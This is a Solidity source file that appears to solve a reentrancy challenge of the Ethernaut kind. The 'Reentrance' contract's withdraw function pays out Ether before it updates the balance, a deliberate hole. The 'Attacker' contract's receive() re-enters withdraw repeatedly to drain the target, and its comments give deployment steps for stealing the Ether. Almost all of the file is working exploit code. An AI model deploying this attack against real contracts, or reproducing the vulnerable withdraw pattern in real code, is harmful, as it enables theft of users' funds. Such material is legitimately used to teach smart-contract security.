// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}



contract Attacker {

    // Create instance of contract above
    Reentrance public bankToRob;
    uint256 public amount = 1 ether;
    address public owner;
    
    // Constructor: Takes the address of the Reentrance contract to interact with it.
    constructor(address payable _reentranceAddress) public {
        bankToRob = Reentrance(_reentranceAddress);
        owner = msg.sender;
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    // receive() external payable {
    //     if (address(bankToRob).balance >= amount) {
    //         bankToRob.withdraw(amount);
    //     }
    // }

    receive() external payable {

        uint256 attackerBalance = address(bankToRob).balance;
    
        uint256 withdrawAmount;

        if (attackerBalance < amount) {
            withdrawAmount = attackerBalance;
        } else {
            withdrawAmount = amount;
        }
 
        
        // Use an if statement to call withdraw if there are funds left in the target contract
        if (attackerBalance > 0) {
            bankToRob.withdraw(withdrawAmount);
        }
        
        // Update target balance after each withdraw to check if funds remain
        attackerBalance = address(bankToRob).balance; 
    }


    function attack() external payable {
        require(msg.value >= amount);
        
        // First send some Ether (amount) to the bank's address
        // Note: deploy original Reentrance contract first, and send some test Ether to steal 
        // Note: next, we deploy the Attacker contract
        // Make sure that the Attacker contract receives the balance (and not the original Reentrance contract!!)
         bankToRob.donate{value: amount}(address(this)); 

    
        // {value: msg.value} is not an argument for the function itself. 
        // Instead, it’s a way to specify the amount of Ether to send along with the function call.
        // The donate function is marked as payable, so it can accept Ether.
        
        // Withdraw that amount
        bankToRob.withdraw(amount);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

}